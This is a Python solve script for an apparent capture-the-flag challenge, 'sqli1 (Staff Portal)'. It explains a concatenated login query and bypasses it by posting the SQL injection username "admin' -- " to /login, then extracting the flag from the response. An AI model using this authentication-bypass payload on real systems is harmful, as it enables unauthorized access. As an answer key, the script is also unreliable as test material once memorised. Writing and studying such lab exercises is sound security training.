#!/usr/bin/env python3
"""Reference solve for sqli1 (Staff Portal).

The sign-in check builds its query by concatenation:

    SELECT id, username, role, notice FROM users
    WHERE username='<u>' AND password='<p>'

Signing in with username  admin' --  comments out the password check, so
the admin row is returned for any password. The dashboard then renders the
admin row's `notice` (the "IT announcement" card), which carries the flag.

    python solve.py                 # localhost:8030
    python solve.py http://host:8030
"""
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8030")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
PAYLOAD_USER = "admin' -- "


def main() -> int:
    s = requests.Session()
    for _ in range(30):
        try:
            s.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)

    try:
        r = s.post(BASE + "/login",
                   data={"username": PAYLOAD_USER, "password": "x"},
                   timeout=10)
    except requests.RequestException as e:
        sys.stderr.write(f"unreachable: {e}\n")
        return 1
    m = FLAG_RE.search(r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found (HTTP {r.status_code})\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
